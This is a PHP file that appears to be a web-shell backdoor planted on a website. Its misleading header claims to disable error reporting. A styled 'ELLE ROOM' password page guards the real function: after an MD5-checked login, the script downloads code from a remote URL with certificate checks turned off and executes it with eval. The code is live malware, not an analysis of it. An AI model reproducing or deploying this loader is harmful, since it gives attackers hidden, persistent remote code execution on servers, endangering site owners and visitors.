<?php
session_start();

/**
 * Disable error reporting 
 
 * ELLE | SEO COPY PASTE > ~N.e.w~ Elle | 88 | Guardian-Angel ~~ | ~~
  
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['G-ELLE'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['G-ELLE']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the ELLE is submitted and correct
if (isset($_POST['ELLE'])) {
    $entered_ELLE = $_POST['ELLE'];
    $hashed_ELLE = '498b98d57ba2665a5380107e2fbd57fa';
    if (md5($entered_ELLE) === $hashed_ELLE) {
        $_SESSION['logged_in'] = true;
        $_SESSION['G-ELLE'] = 'tidak boleh kasar';
    } else {
        
        echo "ELLE ~HERE!";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://git.new/main-elle');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>



<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ARCANE RUNE | ELLE ROOM</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Uncial+Antiqua&display=swap');

body {
    margin: 0;
    height: 100vh;
    display: flex;             /* Mengaktifkan mode flex */
    justify-content: center;   /* Menaruh konten tepat di tengah secara Horizontal */
    align-items: center;       /* Menaruh konten tepat di tengah secara Vertical */
    background: linear-gradient(135deg, #0d0d0f, #1a1a2e);
    overflow: hidden;
    font-family: 'Orbitron', sans-serif;
}

/* CENTER CAPSULE PANEL */
.capsule {
    position: absolute;        /* Ubah ke relative agar mengikuti alur Flexbox body */
    width: 500px; 
    padding: 50px; 
    border-radius: 35px;
    background: rgba(0, 255, 255, 0.08);
    backdrop-filter: blur(14px) saturate(180%);
    box-shadow: 0 0 40px #00ffff88, 0 15px 70px rgba(0, 255, 255, 0.25);
    border: 1px solid rgba(0, 255, 255, 0.35);
    text-align: center;
    z-inELLE: 2;
    /* Animasi tetap jalan, tapi tanpa translate -50% agar tidak geser */
    animation: float 4s ease-in-out infinite alternate;
}

@keyframes float {
    0% { transform: translateY(-10px); }
    100% { transform: translateY(10px); }
}

/* FLOAT ANIMATION */
@keyframes float {
  0% { transform: translateY(-3px); }
  100% { transform: translateY(3px); }
}

/* TITLE */
.title {
  font-family: 'Uncial Antiqua', serif;
  font-size: 30px; /* slightly bigger */
  color: #00ffff;
  text-shadow: 0 0 15px #00ffff88, 0 0 25px #00e5ff;
  margin-bottom: 25px;
  letter-spacing: 2px;
}

/* IMAGE */
.capsule img {
  width: 180px; /* slightly bigger */
  border-radius: 12px;
  margin-bottom: 25px;
  box-shadow: 0 0 30px #00ffffaa;
}

/* INPUT */
input[type=password] {
  width: 100%;
  padding: 16px; /* slightly bigger */
  border-radius: 10px;
  border: none;
  outline: none;
  background: rgba(255,255,255,0.05);
  color: #00ffff;
  font-size: 16px;
  margin-bottom: 18px;
  text-align: center;
  transition: 0.3s;
}

input[type=password]:focus {
  background: rgba(0,255,255,0.12);
  box-shadow: 0 0 18px #00ffffaa;
}

/* BUTTON */
input[type=submit] {
  width: 100%;
  padding: 16px;
  border-radius: 10px;
  border: none;
  background: linear-gradient(90deg, #00ffff, #00e5ff);
  color: #000;
  font-weight: bold;
  cursor: pointer;
  font-size: 16px;
  box-shadow: 0 0 25px #00ffff88;
  transition: 0.3s;
}

input[type=submit]:hover {
  transform: scale(1.05);
  box-shadow: 0 0 40px #00e5ff;
}

/* RUNE CANVAS */
canvas {
  position: fixed;
  inset: 0;
  z-inELLE: 1;
}

/* FLOATING SYMBOLS */
.rune {
  position: fixed;
  font-size: 28px; /* slightly bigger symbols */
  color: #00e5ff55;
  opacity: 0.3;
  animation: drift 8s linear infinite;
  z-inELLE: 1;
}

@keyframes drift {
  from { transform: translateY(-10vh) rotate(0deg); }
  to { transform: translateY(120vh) rotate(360deg); }
}
</style>
</head>
<body>

<canvas id="rain"></canvas>

<div class="capsule">
  <div class="title">ARCANE RUNE | ELLE ROOM</div>
  <img src="https://cbcdn.githack.com/dex88/dex/raw/branch/main/ELLE/img/elle.jpg" alt="Avatar">
  
  <form method="POST">
    <input type="password" name="ELLE" placeholder="ENTER ARCANE KEY">
    <input type="submit" value="UNSEAL">
  </form>
</div>

<script>
// RUNE RAIN EFFECT
const c = document.getElementById("rain");
const ctx = c.getContext("2d");
c.width = window.innerWidth;
c.height = window.innerHeight;

const runes = "ᚠᚢᚦᚨᚱᚲᚷᚹᚺᛉᛋᛏᛒᛗᛚᛝᛟ";
const fontSize = 20;
const columns = Math.floor(c.width / fontSize);
const drops = Array(columns).fill(1);

function draw() {
  ctx.fillStyle = "rgba(0,0,0,0.07)";
  ctx.fillRect(0,0,c.width,c.height);
  ctx.fillStyle = "#00e5ff";
  ctx.font = fontSize + "px Orbitron";

  for (let i = 0; i < drops.length; i++) {
    const text = runes[Math.floor(Math.random()*runes.length)];
    ctx.fillText(text, i*fontSize, drops[i]*fontSize);
    if (drops[i]*fontSize > c.height && Math.random() > 0.975) drops[i]=0;
    drops[i]++;
  }
}
setInterval(draw, 45);

// FLOATING SYMBOLS
const symbols = ["ᛝ","ᛗ","ᛟ","ᛋ","ᚱ","ᛞ"];
for(let i=0;i<25;i++){
  let el=document.createElement("div");
  el.className="rune";
  el.innerText = symbols[Math.floor(Math.random()*symbols.length)];
  el.style.left = Math.random()*100+"vw";
  el.style.top = Math.random()*-100+"vh";
  el.style.animationDuration = (4 + Math.random()*6)+"s";
  document.body.appendChild(el);
}
</script>

</body>
</html>


    <?php
}

?>